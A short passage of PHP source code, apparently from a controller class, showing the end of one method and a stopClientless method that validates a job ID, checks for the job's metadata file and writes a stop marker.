            'exitCode' => is_file($paths['done']) ? trim((string)@file_get_contents($paths['done'])) : '',
        ]);
    }

    public function stopClientless()
    {
        $jobId = $this->request['jobId'] ?? '';
        if (!$this->isSafeJobId($jobId)) {
            return self::setError('Invalid clientless job.');
        }
        $paths = $this->captureJobPaths($jobId);
        if (!is_file($paths['meta'])) {
            return self::setError('Clientless job was not found.');
        }
        @file_put_contents($paths['stop'], gmdate('c'));
        return self::setSuccess(['stopping' => true, 'jobId' => $jobId]);
    }
}
